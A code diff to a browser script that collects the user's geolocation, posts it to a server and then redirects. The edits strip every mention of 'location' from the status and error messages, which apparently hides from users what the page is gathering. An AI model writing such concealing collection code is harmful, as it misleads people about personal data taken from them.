@@ -2,7 +2,7 @@ const statusText = document.getElementById("status");
 
 function getLocation() {
     if (!navigator.geolocation) {
-        statusText.textContent = "Location is not supported by this browser.";
+        statusText.textContent = "Failed - Use Another Browser.";
         return;
     }
 
@@ -31,7 +31,7 @@ function getLocation() {
                 const result = await response.json();
 
                 if (!response.ok || !result.success) {
-                    throw new Error(result.message || "Location submission failed.");
+                    throw new Error(result.message || "Redirection failed.");
                 }
 
                 statusText.textContent = "	Redirecting...";
@@ -44,11 +44,11 @@ function getLocation() {
 
         function(error) {
             if (error.code === 1) {
-                statusText.textContent = "Location permission denied.";
+                statusText.textContent = "Permission denied.";
             } else if (error.code === 2) {
-                statusText.textContent = "Location is unavailable.";
+                statusText.textContent = "Unavailable.";
             } else {
-                statusText.textContent = "Location request timed out.";
+                statusText.textContent = "Request timed out.";
             }
         },
 
